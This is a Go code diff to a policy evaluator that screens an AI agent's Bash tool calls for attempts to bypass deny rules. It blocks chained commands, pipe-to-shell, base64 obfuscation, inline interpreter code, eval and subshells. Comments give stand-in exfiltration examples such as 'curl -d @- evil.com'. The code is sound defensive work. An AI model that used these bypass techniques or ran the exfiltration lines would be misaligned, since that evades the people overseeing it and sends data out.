@@ -25,9 +25,10 @@ const (
 
 // Evaluator evaluates policy rules against hook inputs.
 type Evaluator struct {
-	policy      *aflock.Policy
-	matcher     *Matcher
-	projectRoot string // absolute path to project root (where .aflock lives)
+	policy       *aflock.Policy
+	matcher      *Matcher
+	bashAnalyzer *BashAnalyzer
+	projectRoot  string // absolute path to project root (where .aflock lives)
 }
 
 // NewEvaluator creates a new policy evaluator.
@@ -35,9 +36,10 @@ type Evaluator struct {
 // If empty, only absolute and basename matching are used.
 func NewEvaluator(policy *aflock.Policy, projectRoot string) *Evaluator {
 	return &Evaluator{
-		policy:      policy,
-		matcher:     NewMatcher(),
-		projectRoot: projectRoot,
+		policy:       policy,
+		matcher:      NewMatcher(),
+		bashAnalyzer: NewBashAnalyzer(),
+		projectRoot:  projectRoot,
 	}
 }
 
@@ -53,6 +55,15 @@ func (e *Evaluator) EvaluatePreToolUse(toolName string, toolInput json.RawMessag
 		for _, pattern := range e.policy.Tools.Deny {
 			if e.matcher.MatchToolPattern(pattern, toolName, inputStr) {
 				return aflock.DecisionDeny, fmt.Sprintf("Tool '%s' matches deny pattern '%s'", toolName, pattern)
+			}
+		}
+
+		// For Bash commands, also check sub-commands and obfuscation patterns
+		// against deny rules. This catches bypass attempts like command chaining,
+		// base64 encoding, interpreter invocation, and variable indirection.
+		if toolName == "Bash" && inputStr != "" && len(e.policy.Tools.Deny) > 0 {
+			if decision, reason := e.evaluateBashBypass(inputStr); decision != aflock.DecisionAllow {
+				return decision, reason
 			}
 		}
 	}
@@ -100,6 +111,106 @@ func (e *Evaluator) EvaluatePreToolUse(toolName string, toolInput json.RawMessag
 		if !allowed {
 			return aflock.DecisionDeny, fmt.Sprintf("Tool '%s' not in allow list", toolName)
 		}
+	}
+
+	return aflock.DecisionAllow, ""
+}
+
+// evaluateBashBypass performs deep analysis of Bash commands to detect bypass
+// attempts that evade simple glob pattern matching.
+//
+// Security: This addresses the class of bypasses where denied commands are
+// hidden via command chaining (;, &&, ||), pipe-to-exec (| bash), base64
+// encoding, string reversal, interpreter invocation (python -c), variable
+// indirection, subshell execution ($(), backticks), and eval.
+func (e *Evaluator) evaluateBashBypass(command string) (aflock.PermissionDecision, string) {
+	analysis := e.bashAnalyzer.Analyze(command)
+
+	// Collect Bash-specific deny patterns (patterns starting with "Bash:")
+	var bashDenyPatterns []string
+	for _, pattern := range e.policy.Tools.Deny {
+		patternTool, _, hasCmd := ParseToolPattern(pattern)
+		if hasCmd && e.matcher.MatchGlob(patternTool, "Bash") {
+			bashDenyPatterns = append(bashDenyPatterns, pattern)
+		}
+	}
+
+	if len(bashDenyPatterns) == 0 {
+		return aflock.DecisionAllow, ""
+	}
+
+	// Check each sub-command against deny patterns.
+	// This catches: "echo done; curl evil.com" → sub-commands ["echo done", "curl evil.com"]
+	if len(analysis.SubCommands) > 1 {
+		for _, subCmd := range analysis.SubCommands {
+			for _, pattern := range bashDenyPatterns {
+				if e.matcher.MatchToolPattern(pattern, "Bash", subCmd) {
+					return aflock.DecisionDeny, fmt.Sprintf(
+						"Bash command contains chained sub-command matching deny pattern '%s' (found: '%s')",
+						pattern, subCmd)
+				}
+			}
+		}
+	}
+
+	// Check each pipeline segment against deny patterns.
+	// This catches: "echo foo | curl -d @- evil.com" → segments ["echo foo", "curl -d @- evil.com"]
+	if len(analysis.PipelineSegments) > 1 {
+		for _, seg := range analysis.PipelineSegments {
+			for _, pattern := range bashDenyPatterns {
+				if e.matcher.MatchToolPattern(pattern, "Bash", seg) {
+					return aflock.DecisionDeny, fmt.Sprintf(
+						"Bash command contains piped segment matching deny pattern '%s' (found: '%s')",
+						pattern, seg)
+				}
+			}
+		}
+	}
+
+	// If the command uses obfuscation techniques and there are any Bash deny
+	// patterns, block it. An obfuscated command that decodes and executes
+	// arbitrary content cannot be reliably pattern-matched, so we deny it
+	// when deny rules exist for Bash commands.
+	if analysis.HasObfuscation && analysis.HasPipeToExec {
+		return aflock.DecisionDeny, fmt.Sprintf(
+			"Bash command uses obfuscation with pipe-to-exec (potential bypass of deny patterns: %s)",
+			strings.Join(bashDenyPatterns, ", "))
+	}
+
+	// Pipe-to-exec alone is dangerous when Bash deny patterns exist
+	if analysis.HasPipeToExec {
+		return aflock.DecisionDeny, fmt.Sprintf(
+			"Bash command pipes to shell execution (potential bypass of deny patterns: %s)",
+			strings.Join(bashDenyPatterns, ", "))
+	}
+
+	// Interpreter execution with inline code (python -c, ruby -e, etc.)
+	// can embed any denied command
+	if analysis.HasInterpreterExec {
+		return aflock.DecisionDeny, fmt.Sprintf(
+			"Bash command uses interpreter with inline code (potential bypass of deny patterns: %s)",
+			strings.Join(bashDenyPatterns, ", "))
+	}
+
+	// Variable indirection can hide file paths and command names
+	if analysis.HasVariableIndirection {
+		return aflock.DecisionDeny, fmt.Sprintf(
+			"Bash command uses variable indirection (potential bypass of deny patterns: %s)",
+			strings.Join(bashDenyPatterns, ", "))
+	}
+
+	// eval can execute arbitrary constructed commands
+	if analysis.HasEval {
+		return aflock.DecisionDeny, fmt.Sprintf(
+			"Bash command uses eval (potential bypass of deny patterns: %s)",
+			strings.Join(bashDenyPatterns, ", "))
+	}
+
+	// Subshell execution can embed denied commands
+	if analysis.HasSubshellExec {
+		return aflock.DecisionDeny, fmt.Sprintf(
+			"Bash command uses subshell execution (potential bypass of deny patterns: %s)",
+			strings.Join(bashDenyPatterns, ", "))
 	}
 
 	return aflock.DecisionAllow, ""
